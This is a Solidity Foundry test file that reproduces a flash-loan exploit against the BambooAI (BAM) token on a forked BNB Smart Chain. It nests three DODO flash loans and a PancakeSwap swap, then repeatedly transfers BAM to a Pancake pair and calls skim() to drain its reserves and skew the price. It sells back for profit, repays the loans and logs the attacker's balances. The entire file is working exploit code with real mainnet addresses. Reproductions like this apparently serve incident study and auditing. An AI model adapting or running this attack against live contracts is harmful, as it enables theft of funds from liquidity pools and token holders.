pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "./BamBooAI.sol";
import "./interface.sol";

contract ContractTest is Test {
    function setUp() public {
        uint256 forkId = vm.createFork("bsc", 29668035);
        vm.selectFork(forkId);
    }

    function testExp() public {
        Exp exp = new Exp();
        exp.go();
    }
}

contract Exp {

    ERC20 public wbnb = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    BambooAI public bam = BambooAI(payable(0xED56784bC8F2C036f6b0D8E04Cb83C253e4a6A94));

    IFlashLoan public ddpOracle = IFlashLoan(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IFlashLoan public ddp = IFlashLoan(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IFlashLoan public dppAdvanced = IFlashLoan(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakePair public pancakeMMPair = IPancakePair(0xa1e5f7dB381Af0450E1B3Dc402a4Cf30Ec44Efe7);
    IPancakePair public pancakePair = IPancakePair(0x0557713d02A15a69Dea5DD4116047e50F521C1b1);
    IPancakeRouter02 public pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 public ddpOracleAmount;
    uint256 public ddpAmount;
    uint256 public ddpAdvanceAmount;
    
    function go() public {
        ddpOracleAmount = wbnb.balanceOf(address(ddpOracle));
        console.log("Start flash loan");
        ddpOracle.flashLoan(ddpOracleAmount, 0, address(this), bytes("0x"));
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        if (msg.sender == address(ddpOracle)) {
            ddpOracleFlashloanCall();
        } else if (msg.sender == address(ddp)) {
            ddpFlashLoanCall();
        } else if (msg.sender == address(dppAdvanced)) {
            ddpAdvanceFlashLoanCall();
        }
    }

    function ddpOracleFlashloanCall() public {
        ddpAmount = wbnb.balanceOf(address(ddp));
        ddp.flashLoan(ddpAmount, 0, address(this), bytes("0x"));
    }

    function ddpFlashLoanCall() public {
        ddpAdvanceAmount = wbnb.balanceOf(address(dppAdvanced));
        dppAdvanced.flashLoan(ddpAdvanceAmount, 0, address(this), bytes("0x"));
    }

    function ddpAdvanceFlashLoanCall() public {
        pancakeMMPair.swap(100000000000000, 0, address(this), bytes("0x"));
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        console.log("Attacker wbnb balance %s", wbnb.balanceOf(address(this)));
        wbnb.approve(address(pancakeRouter),type(uint256).max);
        (uint112 re1, uint112 re2,  ) = pancakePair.getReserves();
        console.log("Price of Bam = %s ; %s", re1, re2);

        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bam);
        pancakeRouter.swapTokensForExactTokens(
            135744542131496799520,
            wbnb.balanceOf(address(this)),
            path, 
            address(this),
            1688472389
        );

        for (uint256 i=0;i<10000;i++) {
            uint256 pairBalance = bam.balanceOf(address(pancakePair));
            if (pairBalance<10000) {break;}
            bam.transfer(address(pancakePair), pairBalance-1);
            pancakePair.skim(address(this));

             console.log("Pair Bam balance: %s", bam.balanceOf(address(pancakePair)));
        }

        (uint112 re3, uint112 re4, ) = pancakePair.getReserves();
        console.log("Price of Bam = %s ; %s", re3, re4);

        bam.approve(address(pancakeRouter), type(uint256).max);
        uint256 bamBalance = bam.balanceOf(address(this));
        console.log("Attacker wbnb balance %s", wbnb.balanceOf(address(this)));
        console.log("Attacker bam balance %s", bamBalance);

        address[] memory path1 = new address[](2);
        path1[0] = address(bam);
        path1[1] = address(wbnb);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bam.balanceOf(address(this)),
            0,
            path1,
            address(this),
            1688472389
        );

        (uint112 re5, uint112 re6, ) = pancakePair.getReserves();
        console.log("Price of Bam = %s ; %s", re5, re6);

        console.log("Attacker wbnb balance %s", wbnb.balanceOf(address(this)));
        wbnb.transfer(address(pancakeMMPair), 105000000000000);
        wbnb.transfer(address(dppAdvanced), ddpAdvanceAmount);
        wbnb.transfer(address(ddp), ddpAmount);
        console.log("Attacker wbnb balance %s", wbnb.balanceOf(address(this)));
        wbnb.transfer(address(ddpOracle), ddpOracleAmount);
        console.log("Attacker wbnb balance %s", wbnb.balanceOf(address(this)));
    }

}

